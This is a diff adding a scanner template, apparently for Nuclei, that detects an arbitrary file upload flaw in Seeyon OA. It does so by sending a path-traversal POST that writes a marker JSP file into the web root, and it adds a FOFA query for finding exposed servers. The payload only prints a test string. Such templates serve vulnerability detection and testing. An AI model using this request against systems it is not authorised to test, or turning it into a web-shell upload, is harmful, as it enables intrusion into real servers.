@@ -1,0 +1,39 @@
+id: Seeyon-wpsAssistServlet-upload
+
+info:
+  name: Seeyon OA wpsAssistServlet upload
+  author: cr
+  severity: high
+  reference:
+    - https://github.com/coldrainh
+  tags: Seeyon,oa,upload
+
+requests:
+  - method: POST
+    path:
+      - '{{BaseURL}}/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg.jsp&fileId=2'
+
+    body: |
+        --59229605f98b8cf290a7b8908b34616b
+        Content-Disposition: form-data; name="upload"; filename="123.xls"
+        Content-Type: application/vnd.ms-excel
+
+        <% out.println("seeyon_vuln");%>
+        --59229605f98b8cf290a7b8908b34616b--
+
+    headers:
+        Content-Length: 349
+        Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
+        Accept-Encoding: gzip
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "officeTransResultFlag"
+        part: body
+
+      - type: status
+        status:
+          - 200
+#fofa-query:app="致远互联-OA" && title="V8.0SP2"
